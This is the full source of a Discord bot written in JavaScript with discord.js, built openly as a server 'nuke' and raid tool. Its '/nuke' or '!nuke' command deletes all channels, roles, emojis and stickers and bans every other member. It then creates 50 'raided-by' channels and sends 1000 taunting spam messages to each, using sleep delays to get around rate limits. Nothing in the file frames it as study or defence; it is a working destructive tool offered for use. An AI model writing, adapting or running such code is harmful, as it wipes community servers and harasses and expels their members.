require('dotenv').config();
const { Client, GatewayIntentBits, PermissionsBitField, ChannelType, REST, Routes } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildEmojisAndStickers,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID || null;

const CHANNEL_COUNT = 50;
const MESSAGES_PER_CHANNEL = 1000;
const SPAM_TEXT = '🔥 GET RAIDED BY {username} - THIS SERVER IS OURS 🔥';

client.once('ready', async () => {
  console.log(`🔥 ${client.user.tag} online.`);
  const rest = new REST({ version: '10' }).setToken(TOKEN);
  const commands = [{
    name: 'nuke',
    description: '💀 Nuke + 50 channels + 1000 msgs each (Admin)',
    default_member_permissions: PermissionsBitField.Flags.Administrator.toString()
  }];
  try {
    if (GUILD_ID) {
      await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    } else {
      await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    }
    console.log('✅ Slash command registered.');
  } catch (e) { console.error('Register failed:', e); }
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand() || interaction.commandName !== 'nuke') return;
  await interaction.deferReply({ ephemeral: true });
  await executeNuke(interaction);
});

client.on('messageCreate', async msg => {
  if (msg.author.bot || !msg.guild || msg.content !== '!nuke') return;
  if (!msg.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return msg.reply('❌ Admin required.');
  }
  await executeNuke(msg);
});

async function executeNuke(ctx) {
  const guild = ctx.guild;
  const author = ctx.member || ctx.author;
  const reply = ctx.reply || ctx.channel.send.bind(ctx.channel);
  const editReply = ctx.editReply || (() => {});

  if (!guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
    const err = '❌ I need Administrator.';
    if (ctx.editReply) await ctx.editReply(err);
    else await reply(err);
    return;
  }

  const username = (author.user?.username || author.user?.tag || 'raidboss').toLowerCase().replace(/[^a-z0-9-]/g, '-');
  const spamText = SPAM_TEXT.replace(/{username}/g, author.user?.tag || 'RAIDER');

  if (ctx.editReply) {
    await ctx.editReply(`☢️ **STARTING** – ${CHANNEL_COUNT} channels, ${MESSAGES_PER_CHANNEL} msgs each...`);
  } else {
    await reply(`☢️ **STARTING** – ${CHANNEL_COUNT} channels, ${MESSAGES_PER_CHANNEL} msgs each...`);
  }

  // ---- DELETE ALL CHANNELS ----
  for (const [, ch] of guild.channels.cache) {
    try { await ch.delete(); await sleep(100); } catch (_) {}
  }

  // ---- DELETE ROLES (except @everyone) ----
  for (const [, role] of guild.roles.cache.filter(r => r.id !== guild.id)) {
    try { await role.delete(); await sleep(100); } catch (_) {}
  }

  // ---- DELETE EMOJIS ----
  for (const [, emoji] of guild.emojis.cache) {
    try { await emoji.delete(); await sleep(100); } catch (_) {}
  }

  // ---- DELETE STICKERS ----
  for (const [, sticker] of guild.stickers.cache) {
    try { await sticker.delete(); await sleep(100); } catch (_) {}
  }

  // ---- BAN ALL MEMBERS ----
  let banned = 0;
  for (const [, member] of guild.members.cache) {
    if (member.id === author.id || member.id === client.user.id) continue;
    try {
      await member.ban({ reason: 'Nuke by ' + (author.user?.tag || author.tag) });
      banned++;
      if (banned % 10 === 0) await sleep(200);
    } catch (_) {}
  }

  // ---- CREATE 50 CHANNELS ----
  const channels = [];
  for (let i = 0; i < CHANNEL_COUNT; i++) {
    try {
      const ch = await guild.channels.create({
        name: i === 0 ? `raided-by-${username}` : `raided-by-${username}-${i}`,
        type: ChannelType.GuildText,
        permissionOverwrites: [{
          id: guild.id,
          allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory]
        }]
      });
      channels.push(ch);
      console.log(`✅ Created channel ${i+1}/${CHANNEL_COUNT}`);
      if (i % 10 === 0) await sleep(300);
    } catch (err) {
      console.error(`Failed to create channel ${i}:`, err.message);
    }
  }

  console.log(`📢 Created ${channels.length} channels. Starting spam...`);

  // ---- SPAM 1000 MESSAGES IN EACH CHANNEL (FORCE SPAM) ----
  let totalSent = 0;
  for (let chIdx = 0; chIdx < channels.length; chIdx++) {
    const channel = channels[chIdx];
    let sent = 0;
    let failures = 0;

    for (let msgIdx = 0; msgIdx < MESSAGES_PER_CHANNEL; msgIdx++) {
      try {
        await channel.send(`${spamText} [${msgIdx+1}/${MESSAGES_PER_CHANNEL}]`);
        sent++;
        totalSent++;
        failures = 0; // reset on success

        // Delay every 10 messages to avoid rate-limit
        if (sent % 10 === 0) await sleep(150);

      } catch (err) {
        failures++;
        console.log(`⚠️ Rate-limited on ${channel.name} (${failures} failures)`);
        if (failures > 5) {
          console.log(`❌ Too many failures on ${channel.name}, moving to next channel.`);
          break; // move to next channel if channel is dead
        }
        await sleep(1000); // wait 1 second then retry
        msgIdx--; // retry this message
      }
    }

    console.log(`✅ Channel ${chIdx+1}/${channels.length} – sent ${sent} messages`);
    await sleep(200); // between channels
  }

  // ---- FINAL SUMMARY ----
  const summary = `💀 **COMPLETE**\nChannels: ${channels.length}\nMessages sent: ${totalSent}\nMembers banned: ${banned}\nExecutor: ${author.user?.tag || author.tag}`;
  try {
    if (channels.length > 0) {
      await channels[0].send(summary);
    }
  } catch (_) {}

  console.log(`🎯 APOCALYPSE DONE: ${channels.length} channels, ${totalSent} messages, ${banned} bans`);
  if (ctx.editReply) {
    await ctx.editReply(`✅ Done. ${channels.length} channels, ${totalSent} messages, ${banned} bans.`);
  }
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

client.login(TOKEN);
